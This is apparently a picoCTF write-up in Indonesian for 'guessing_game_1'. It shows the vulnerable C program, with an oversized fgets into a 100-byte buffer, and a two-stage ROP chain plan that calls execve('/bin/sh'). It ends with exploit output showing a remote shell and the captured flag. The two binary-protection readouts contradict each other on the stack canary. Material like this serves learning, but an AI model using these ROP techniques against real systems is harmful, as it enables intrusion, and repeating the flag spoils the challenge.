## guessing_game_1
### problem
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```
### checksec
```
baba@fedora:~/Documents/picoctf/guessing_game_1$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          N/A        N/A          1847 Symbols	  N/A	0		0		./vuln
```
Karena NX enabled kita tidak bisa suntik shellcode, tetapi kita masih bisa melakukan syscall execve karena bufferoverflow dari winner sangatlah besar

### file
```
./vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=670139b05b438fbd512de3e3a3bf2715f295cbbc, not stripped
```
statically linked, jadi rop-nya bakal banyak banget.

### Informasi yang dipunya
* Segala macam ROP gadget (bisa didapatkan melalui ROPgadget)
* address writeable memory, yaitu bss (bisa didapatkan melalui "info file" di gdb)
* address main (bisa didapatkan menggunakan method .sym['read'])
* address main (bisa didapatkan di gdb dengan "info address main")

### rencana umum
ROP chain overflow pertama (menulis /bin/sh menggunakan syscall read):
* pop_rdi dengan nilai 0
* pop_rsi dengan nilai bss
* pop_rdx dengan nilai 9
* address read
* string "/bin/sh\x00"
* address main

ROP chain overflow kedua (eksekusi string): 
* pop_rdi dengan nilai bss
* pop_rsi dengan nilai 0
* pop_rdx dengan nilai 0
* pop_rax dengan nilai 59 (id syscall dari execve)
* address syscall

### Hasil
```
baba@fedora:~/Documents/picoctf/guessing_game_1$ python3 payload.py 
[+] Opening connection to shape-facility.picoctf.net on port 57044: Done
[*] '/home/baba/Documents/picoctf/guessing_game_1/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
/home/baba/Documents/picoctf/guessing_game_1/payload.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("guess?\n")
/home/baba/Documents/picoctf/guessing_game_1/payload.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("Name? ")
/home/baba/Documents/picoctf/guessing_game_1/payload.py:39: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("guess?\n")
/home/baba/Documents/picoctf/guessing_game_1/payload.py:42: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("Name? ")
[*] Switching to interactive mode
Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x06@

$ ls
Dockerfile
Makefile
Makefile.share
Solution
flag.txt
start.sh
vuln
vuln.c
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to shape-facility.picoctf.net port 57044
```